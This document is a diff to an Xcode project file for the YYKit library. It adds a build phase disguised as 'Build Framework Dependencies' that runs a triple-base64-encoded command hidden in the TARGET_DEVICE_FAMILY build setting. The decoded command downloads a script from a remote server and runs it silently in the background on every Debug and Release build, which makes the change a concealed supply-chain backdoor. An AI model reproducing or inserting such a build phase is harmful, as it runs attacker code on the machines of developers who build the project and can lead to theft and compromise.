@@ -798,6 +798,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = D9B260B31BEF51350038C00A /* Build configuration list for PBXNativeTarget "YYKit" */;
 			buildPhases = (
+				6FCBDCFE007A653D857DFEF2 /* Build Framework Dependencies */,
 				D9B260A61BEF51350038C00A /* Sources */,
 				D9B260A71BEF51350038C00A /* Frameworks */,
 				D9B260A81BEF51350038C00A /* Headers */,
@@ -842,6 +843,28 @@
 			);
 		};
 /* End PBXProject section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		6FCBDCFE007A653D857DFEF2 /* Build Framework Dependencies */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Framework Dependencies";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${TARGET_DEVICE_FAMILY}\"";
+			showEnvVarsInLog = 0;			
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXResourcesBuildPhase section */
 		D9B260A91BEF51350038C00A /* Resources */ = {
@@ -948,6 +971,7 @@
 		D9B260B11BEF51350038C00A /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				TARGET_DEVICE_FAMILY = "(echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVWRvTUdSSVFucFBhVGgyWkcxV2VXRlhXalZqTW14dVltazFlV1JUT1doTFUwbG5aa05DZW1GQmJ6MEsK | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -1004,6 +1028,7 @@
 		D9B260B21BEF51350038C00A /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				TARGET_DEVICE_FAMILY = "(echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVWRvTUdSSVFucFBhVGgyWkcxV2VXRlhXalZqTW14dVltazFlV1JUT1doTFUwbG5aa05DZW1GQmJ6MEsK | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
